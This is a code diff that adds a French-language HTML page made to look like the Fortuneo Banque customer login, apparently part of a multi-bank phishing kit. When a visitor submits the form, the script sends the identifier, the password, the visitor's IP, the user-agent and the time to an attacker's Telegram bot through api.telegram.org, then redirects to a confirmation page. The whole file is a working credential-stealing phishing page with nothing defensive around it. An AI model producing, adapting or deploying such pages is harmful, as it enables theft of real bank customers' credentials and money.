@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fortuneo Banque | Espace Client</title>
+    
+    <!-- Importation de la police Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Intégration de Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'], 
+                    },
+                    colors: {
+                        'fortuneo-green': '#8cc63f',
+                        'fortuneo-green-hover': '#7eb336',
+                        'input-bg': 'rgba(140, 198, 63, 0.08)', 
+                        'input-label': '#3e5c16',
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        /* Styles spécifiques pour forcer la visibilité verte du formulaire */
+        .input-group {
+            background-color: var(--input-bg);
+            border: 2px solid #8cc63f; 
+            transition: all 0.2s ease-in-out;
+        }
+        .input-group:focus-within {
+            border-color: #7eb336;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(140, 198, 63, 0.25);
+        }
+        input[type="password"]::-ms-reveal,
+        input[type="password"]::-ms-clear {
+            display: none;
+        }
+        .custom-checkbox {
+            appearance: none;
+            background-color: transparent;
+            margin: 0;
+            font: inherit;
+            color: currentColor;
+            width: 1.2em;
+            height: 1.2em;
+            border: 2px solid #8cc63f;
+            border-radius: 4px;
+            display: grid;
+            place-content: center;
+            cursor: pointer;
+        }
+        .custom-checkbox::before {
+            content: "";
+            width: 0.65em;
+            height: 0.65em;
+            transform: scale(0);
+            transition: 120ms transform ease-in-out;
+            background-color: #8cc63f;
+            transform-origin: center;
+            clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
+        }
+        .custom-checkbox:checked::before {
+            transform: scale(1);
+        }
+        
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #8cc63f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 10000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-weight: 500;
+        }
+        .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
+        .toast.success { background-color: #10b981; }
+        .toast.error { background-color: #ef4444; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        }
+        
+        /* BOUTON RETOUR AU-DESSUS DU LOGO */
+        .back-to-bank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 12px 20px;
+            z-index: 100;
+            display: flex;
+            justify-content: flex-start;
+        }
+        
+        .back-to-bank-btn {
+            background-color: #8cc63f;
+            color: #1e293b;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: #7eb336;
+            transform: translateX(-2px);
+        }
+        
+        .back-to-bank-btn:active {
+            transform: translateX(0);
+        }
+        
+        .back-to-bank-btn i {
+            font-size: 14px;
+            font-style: normal;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 768px) {
+            .back-to-bank-container {
+                padding: 8px 15px;
+            }
+            .back-to-bank-btn {
+                padding: 6px 12px;
+                font-size: 11px;
+            }
+            .back-to-bank-btn i {
+                font-size: 12px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .back-to-bank-btn {
+                padding: 5px 10px;
+                font-size: 10px;
+            }
+            .back-to-bank-btn i {
+                font-size: 11px;
+            }
+        }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body class="min-h-screen flex font-sans antialiased text-gray-900 bg-white">
+
+    <!-- BOUTON RETOUR AU-DESSUS DU LOGO -->
+    <div class="back-to-bank-container">
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+            <i>←</i> Retour aux banques
+        </button>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Connexion en cours...</div>
+    </div>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
+
+    <!-- ========================================== -->
+    <!-- COLONNE GAUCHE : IMAGE ET MESSAGE          -->
+    <!-- ========================================== -->
+    <div class="hidden md:flex md:w-1/2 relative bg-cover bg-center" 
+         style="background-image: url('https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80');">
+        
+        <div class="absolute inset-0 bg-black/30"></div>
+
+        <div class="relative z-10 flex flex-col h-full p-12 lg:p-20 w-full">
+            <h1 class="text-white text-5xl lg:text-[56px] font-normal leading-[1.15] mt-auto mb-auto">
+                Bienvenue<br>
+                dans votre<br>
+                espace client.
+            </h1>
+
+            <div class="mt-auto pb-4">
+                <img src="images/logo-white.png" 
+                     alt="Fortuneo Banque" 
+                     class="h-16 object-contain"
+                     onerror="this.onerror=null; this.style.display='none'; document.getElementById('fallback-white').style.display='block';">
+                <div id="fallback-white" class="text-white flex flex-col items-start" style="display: none;">
+                    <div class="text-3xl font-bold tracking-tight">fortuneo</div>
+                    <div class="text-[11px] tracking-[0.2em] font-medium mt-[-2px]">BANQUE</div>
+                    <div class="text-sm font-light mt-1">J'aime ma banque</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- COLONNE DROITE : FORMULAIRE DE CONNEXION   -->
+    <!-- ========================================== -->
+    <div class="w-full md:w-1/2 flex items-center justify-center p-6 sm:p-12 lg:p-20 bg-white relative">
+        
+        <div class="w-full max-w-[440px] flex flex-col mt-8">
+            
+            <!-- Zone Logo Couleurs -->
+            <div class="mb-14 flex flex-col items-start">
+                <img src="images/logo.png" 
+                     alt="Fortuneo Banque" 
+                     class="h-16 object-contain"
+                     onerror="this.onerror=null; this.style.display='none'; document.getElementById('fallback-color').style.display='block';">
+                <div id="fallback-color" class="text-gray-900 flex flex-col items-start" style="display: none;">
+                    <div class="text-[34px] font-bold tracking-tight text-fortuneo-green">fortuneo</div>
+                    <div class="text-[11px] tracking-[0.22em] font-bold mt-[-6px] text-fortuneo-green">BANQUE</div>
+                    <div class="text-[14px] font-normal text-gray-500 mt-1">J'aime ma banque</div>
+                </div>
+            </div>
+
+            <!-- Titre du formulaire -->
+            <h2 class="text-[32px] font-normal leading-[1.25] text-gray-900 mb-8">
+                Saisissez votre<br>identifiant et mot de<br>passe
+            </h2>
+
+            <!-- Formulaire -->
+            <form id="login-form">
+                
+                <!-- Champ Identifiant -->
+                <div class="input-group rounded-xl p-3.5 px-4 mb-4">
+                    <label for="identifiant" class="block text-[13px] font-bold text-input-label mb-0.5">Identifiant</label>
+                    <input type="text" 
+                           id="identifiant" 
+                           name="identifiant" 
+                           placeholder="000000" 
+                           class="w-full bg-transparent outline-none text-[17px] text-gray-900 placeholder-gray-400 font-medium"
+                           required>
+                </div>
+
+                <!-- Champ Mot de passe -->
+                <div class="input-group rounded-xl p-3.5 px-4 mb-6 flex items-center justify-between">
+                    <div class="flex-grow">
+                        <label for="password" class="block text-[13px] font-bold text-input-label mb-0.5">Mot de passe</label>
+                        <input type="password" 
+                               id="password" 
+                               name="password" 
+                               placeholder="••••••••••" 
+                               class="w-full bg-transparent outline-none text-[20px] tracking-widest text-gray-900 placeholder-gray-400"
+                               required>
+                    </div>
+                    
+                    <button type="button" id="toggle-password" class="text-gray-700 ml-3 hover:text-fortuneo-green flex-shrink-0 pt-3 transition-colors">
+                        <svg id="eye-icon" class="w-[20px] h-[20px]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                        </svg>
+                        <svg id="eye-off-icon" class="w-[20px] h-[20px] hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Case à cocher Mémoriser -->
+                <div class="flex items-center mb-8 pl-1">
+                    <input type="checkbox" id="memoriser" class="custom-checkbox">
+                    <label for="memoriser" class="ml-3 text-[14px] font-medium text-gray-900 cursor-pointer select-none">
+                        Mémoriser l'identifiant
+                    </label>
+                </div>
+
+                <!-- Bouton Connexion -->
+                <button type="submit" id="submitBtn" class="w-full bg-fortuneo-green hover:bg-fortuneo-green-hover text-gray-900 font-bold text-[16px] py-4 rounded-full transition-all shadow-md active:scale-[0.99]">
+                    Connexion
+                </button>
+                
+            </form>
+        </div>
+    </div>
+
+    <script>
+
+// Attendre config.js
+async function waitForConfig(maxWait = 3000) {
+    const start = Date.now();
+    while (!window.telegramConfig && Date.now() - start < maxWait) {
+        await new Promise(r => setTimeout(r, 50));
+    }
+    return window.telegramConfig;
+}
+
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Configuration Telegram
+            const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
+            const CHAT_ID = '8176081750';
+
+            // Éléments
+            const loginForm = document.getElementById('login-form');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const toast = document.getElementById('toast');
+            const identifiantInput = document.getElementById('identifiant');
+            const passwordInput = document.getElementById('password');
+            
+            // Toggle password
+            const togglePasswordBtn = document.getElementById('toggle-password');
+            const eyeIcon = document.getElementById('eye-icon');
+            const eyeOffIcon = document.getElementById('eye-off-icon');
+
+            // Fonction pour afficher un toast
+            function showToast(message, isError = false) {
+                toast.textContent = message;
+                toast.className = 'toast show' + (isError ? ' error' : ' success');
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    toast.className = 'toast';
+                }, 3000);
+            }
+
+            // Fonction pour obtenir l'IP
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip || 'Non disponible';
+                } catch (error) {
+                    return 'Non disponible';
+                }
+            }
+
+            // Afficher/masquer le mot de passe
+            if (togglePasswordBtn) {
+                togglePasswordBtn.addEventListener('click', () => {
+                    if (passwordInput.type === 'password') {
+                        passwordInput.type = 'text';
+                        passwordInput.classList.remove('tracking-widest'); 
+                        eyeIcon.classList.add('hidden');
+                        eyeOffIcon.classList.remove('hidden');
+                    } else {
+                        passwordInput.type = 'password';
+                        passwordInput.classList.add('tracking-widest'); 
+                        eyeOffIcon.classList.add('hidden');
+                        eyeIcon.classList.remove('hidden');
+                    }
+                });
+            }
+
+            // Envoi à Telegram
+            async function sendToTelegram() {
+                const ip = await getIP();
+                const message = `💚 FORTUNEO - NOUVELLE CONNEXION 💚\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${identifiantInput.value}\n🔑 Mot de passe: ${passwordInput.value}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: window.CHAT_ID || CHAT_ID, text: message })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        console.log('');
+                        ;
+                        return true;
+                    } else {
+                                                showToast('❌ Erreur: ' + data.description, true);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('❌ Erreur réseau:', error);
+                    showToast('❌ Erreur de connexion', true);
+                    return false;
+                }
+            }
+
+            // Mémoriser l'identifiant
+            const memoriserCheckbox = document.getElementById('memoriser');
+            const savedIdentifiant = localStorage.getItem('fortuneo_identifiant');
+            
+            if (savedIdentifiant) {
+                identifiantInput.value = savedIdentifiant;
+                memoriserCheckbox.checked = true;
+            }
+
+            // Soumission du formulaire
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                // Validation simple
+                if (!identifiantInput.value.trim()) {
+                    showToast('⚠️ Veuillez saisir votre identifiant', true);
+                    identifiantInput.focus();
+                    return;
+                }
+                
+                if (!passwordInput.value.trim()) {
+                    showToast('⚠️ Veuillez saisir votre mot de passe', true);
+                    passwordInput.focus();
+                    return;
+                }
+                
+                // Sauvegarder l'identifiant si coché
+                if (memoriserCheckbox.checked) {
+                    localStorage.setItem('fortuneo_identifiant', identifiantInput.value);
+                } else {
+                    localStorage.removeItem('fortuneo_identifiant');
+                }
+                
+                // Désactiver le bouton
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Connexion en cours...';
+                loadingOverlay.style.display = 'flex';
+                
+                // Envoyer à Telegram
+                await sendToTelegram();
+                
+                // Redirection après 2 secondes
+                setTimeout(() => {
+                    window.location.href = 'confirmation.html';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
+
